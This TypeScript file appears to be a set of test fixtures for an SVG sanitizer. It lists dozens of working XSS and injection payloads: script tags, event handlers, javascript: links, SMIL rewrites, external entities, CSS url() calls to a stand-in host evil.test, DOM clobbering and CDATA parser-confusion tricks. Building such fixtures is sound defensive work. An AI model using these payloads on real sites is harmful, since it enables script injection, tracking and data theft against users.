// Hostile SVG fixtures, one per attack class. Test data only.
// Convention: script execution is alert(1); network access goes to evil.test.

const NS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"';
const XHTML = 'xmlns="http://www.w3.org/1999/xhtml"';
const svg = (body: string, attrs = '') => `<svg ${NS} viewBox="0 0 10 10" ${attrs}>${body}</svg>`;

export const payloads: Record<string, string> = {
  // Script elements
  'script inline': svg('<script>alert(1)</script>'),
  'script cdata': svg('<script><![CDATA[alert(1)]]></script>'),
  'script external': svg('<script xlink:href="http://evil.test/x.js"/>'),
  'script data href': svg('<script type="text/ecmascript" href="data:,alert(1)"/>'),
  'script in defs behind use': svg('<defs><g id="x"><script>alert(1)</script></g></defs><use href="#x"/>'),
  'script svg prefix': `<s:svg xmlns:s="http://www.w3.org/2000/svg"><s:script>alert(1)</s:script></s:svg>`,
  'script xhtml namespace': svg(`<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>`),

  // Event handlers
  'onload on root': svg('<rect/>', 'onload="alert(1)"'),
  'onload uppercase': svg('<rect/>', 'ONLOAD="alert(1)"'),
  'onload on nested svg': svg('<svg onload="alert(1)"><rect/></svg>'),
  'onerror on image': svg('<image href="http://evil.test/missing.png" onerror="alert(1)"/>'),
  'onclick and friends': svg('<rect width="10" height="10" onclick="alert(1)" onmouseover="alert(1)" onfocus="alert(1)" tabindex="0"/>'),
  'onbegin on animate': svg('<rect><animate attributeName="x" dur="1s" onbegin="alert(1)" onend="alert(1)"/></rect>'),
  'autofocus onfocus': svg('<a href="#" onfocus="alert(1)" autofocus="" tabindex="0"><text>x</text></a>'),

  // Scriptable links
  'a href javascript': svg('<a href="javascript:alert(1)"><rect width="10" height="10"/></a>'),
  'a xlink:href javascript': svg('<a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a>'),
  'a href javascript with tab entity': svg('<a href="java&#x09;script:alert(1)"><rect width="10" height="10"/></a>'),
  'a href javascript with leading space': svg('<a href="  javascript:alert(1)"><rect width="10" height="10"/></a>'),
  'a href javascript mixed case': svg('<a href="JaVaScRiPt:alert(1)"><rect width="10" height="10"/></a>'),
  'a href data html': svg('<a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"><rect width="10" height="10"/></a>'),
  'a href external': svg('<a href="//evil.test/"><rect width="10" height="10"/></a>'),
  'xml:base javascript': svg('<a xml:base="javascript:alert(1)//" href="#"><rect width="10" height="10"/></a>'),

  // SMIL rewriting an attribute into something scriptable
  'animate href to javascript': svg('<a href="#"><animate attributeName="href" values="javascript:alert(1)" dur="1s" fill="freeze"/><rect width="10" height="10"/></a>'),
  'set href to javascript': svg('<a href="#"><set attributeName="xlink:href" to="javascript:alert(1)"/><rect width="10" height="10"/></a>'),
  'set handler': svg('<rect width="10" height="10"><set attributeName="onmouseover" to="alert(1)"/></rect>'),
  'animateTransform and discard': svg('<rect><animateTransform attributeName="transform" type="rotate" to="360" dur="1s"/></rect><discard begin="1s"/>'),

  // Embedded documents
  'foreignObject script': svg(`<foreignObject width="10" height="10"><body ${XHTML} onload="alert(1)"><script>alert(1)</script></body></foreignObject>`),
  'foreignObject iframe': svg(`<foreignObject width="10" height="10"><iframe ${XHTML} src="javascript:alert(1)"/></foreignObject>`),
  'xhtml iframe': svg(`<iframe ${XHTML} src="javascript:alert(1)"/>`),
  'xhtml img onerror': svg(`<img ${XHTML} src="http://evil.test/x.png" onerror="alert(1)"/>`),
  'xhtml embed and object': svg(`<embed ${XHTML} src="http://evil.test/x.swf"/><object ${XHTML} data="http://evil.test/x.html"/>`),
  'xhtml media': svg(`<video ${XHTML}><source src="http://evil.test/x.mp4" onerror="alert(1)"/></video><audio ${XHTML} src="http://evil.test/x.mp3" onerror="alert(1)"/>`),
  'xhtml link stylesheet': svg(`<link ${XHTML} rel="stylesheet" href="http://evil.test/x.css"/>`),
  'xhtml meta refresh': svg(`<meta ${XHTML} http-equiv="refresh" content="0;url=http://evil.test/"/>`),
  'xhtml base': svg(`<base ${XHTML} href="http://evil.test/"/><image href="x.png" width="1" height="1"/>`),

  // External and nested references
  'use external': svg('<use href="http://evil.test/x.svg#a"/>'),
  'use xlink external': svg('<use xlink:href="//evil.test/x.svg#a"/>'),
  'use data svg': svg('<use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=#a"/>'),
  'image external': svg('<image href="http://evil.test/pixel.png" width="1" height="1"/>'),
  'image xlink external': svg('<image xlink:href="https://evil.test/pixel.png" width="1" height="1"/>'),
  'image data svg': svg('<image href="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22alert(1)%22/%3E" width="1" height="1"/>'),
  'image javascript': svg('<image href="javascript:alert(1)" width="1" height="1"/>'),
  'feImage external': svg('<filter id="f"><feImage href="http://evil.test/x.png"/></filter><rect filter="url(#f)" width="10" height="10"/>'),
  'feImage javascript': svg('<filter id="f"><feImage xlink:href="javascript:alert(1)"/></filter><rect filter="url(#f)" width="10" height="10"/>'),
  'textPath external': svg('<text><textPath href="http://evil.test/x.svg#p">hi</textPath></text>'),
  'legacy cursor and tref': svg('<cursor xlink:href="http://evil.test/c.png"/><text><tref xlink:href="http://evil.test/x.svg#t"/></text>'),
  'pattern with external image': svg('<pattern id="p" width="1" height="1"><image href="http://evil.test/x.png" width="1" height="1"/></pattern><rect fill="url(#p)" width="10" height="10"/>'),

  // CSS that reaches the network
  'style import': svg('<style>@import url(http://evil.test/x.css);</style><rect/>'),
  'style import string': svg('<style>@import "http://evil.test/x.css";</style><rect/>'),
  'style font-face': svg('<style>@font-face{font-family:x;src:url(http://evil.test/f.woff)}</style><text font-family="x">a</text>'),
  'style rule inlined by svgo': svg('<style>.a{fill:url(http://evil.test/x.svg#a)}</style><rect class="a" width="10" height="10"/>'),
  'style universal rule': svg('<style>*{filter:url(//evil.test/x.svg#f)}</style><rect width="10" height="10"/>'),
  'style attribute url': svg('<rect style="fill:url(http://evil.test/x.svg#a)" width="10" height="10"/>'),
  'style attribute image-set': svg('<rect style="background-image:image-set(\'http://evil.test/x.png\' 1x)" width="10" height="10"/>'),
  'style attribute legacy bindings': svg('<rect style="behavior:url(http://evil.test/x.htc);-moz-binding:url(http://evil.test/x.xml#a)" width="10" height="10"/>'),
  'presentation attribute url': svg('<rect fill="url(http://evil.test/x.svg#a)" width="10" height="10"/>'),
  'presentation attributes that take url': svg('<rect filter="url(http://evil.test/f.svg#f)" mask="url(http://evil.test/m.svg#m)" clip-path="url(http://evil.test/c.svg#c)" marker-start="url(http://evil.test/k.svg#k)" cursor="url(http://evil.test/c.png), auto" width="10" height="10"/>'),
  'css escape in url': svg('<rect fill="u\\72l(http://evil.test/x.svg#a)" width="10" height="10"/>'),
  'css escape in style': svg('<rect style="fill:u\\000072l(http://evil.test/x.svg#a)" width="10" height="10"/>'),
  'mixed local and remote url': svg('<linearGradient id="g"/><rect style="fill:url(#g);mask:url(http://evil.test/m.svg#m)" width="10" height="10"/>'),

  // XML features
  'entity expands to script': `<!DOCTYPE svg [<!ENTITY x "<script xmlns='http://www.w3.org/2000/svg'>alert(1)</script>">]>${svg('&x;')}`,
  'entity in href': `<!DOCTYPE svg [<!ENTITY js "javascript:alert(1)">]>${svg('<a href="&js;"><rect width="10" height="10"/></a>')}`,
  'external entity': `<!DOCTYPE svg [<!ENTITY x SYSTEM "http://evil.test/x.txt">]>${svg('<text>&x;</text>')}`,
  'xml-stylesheet': `<?xml-stylesheet href="http://evil.test/x.css" type="text/css"?>${svg('<rect/>')}`,
  'xsl stylesheet': `<?xml-stylesheet href="http://evil.test/x.xsl" type="text/xsl"?>${svg('<rect/>')}`,

  // DOM clobbering: ids and names that shadow document and form properties
  'clobbering ids and names': svg('<rect id="cookie" name="cookie"/><g id="body" name="body"/><a id="location" name="location" href="#"><text id="forms">x</text></a><image id="getElementById" name="getElementById"/><filter id="blur"/>'),

  // Markup hidden in text, waiting for a different parser
  'cdata breaks out of style': svg('<style><![CDATA[</style><img src="x" onerror="alert(1)">]]></style>'),
  'cdata breaks out of title': svg('<title><![CDATA[</title><script>alert(1)</script>]]></title>'),
  'cdata breaks out of desc': svg('<desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></desc>'),
  'cdata closes the svg': svg('<text><![CDATA[</text></svg><img src=x onerror=alert(1)>]]></text>'),
  'escaped markup in title': svg('<title>&lt;/title&gt;&lt;img src=x onerror=alert(1)&gt;</title><rect/>'),
  'escaped markup in id': svg('<rect id="&quot;&gt;&lt;/svg&gt;&lt;img src=x onerror=alert(1)&gt;"/>'),
  'escaped markup in label attributes': `<svg ${NS} xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" viewBox="0 0 10 10"><g inkscape:label="&quot;&gt;&lt;img src=x onerror=alert(1)&gt;" data-name="&lt;script&gt;alert(1)&lt;/script&gt;" aria-label="&lt;svg onload=alert(1)&gt;"><rect/></g></svg>`,
  'comment hides markup': svg('<!--><img src=x onerror=alert(1)>--><rect/>'),
  'html tag breaks out of foreign content': svg(`<p ${XHTML}><img src="x" onerror="alert(1)"/></p>`),
  'math namespace confusion': svg('<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></mtext></math>'),
};
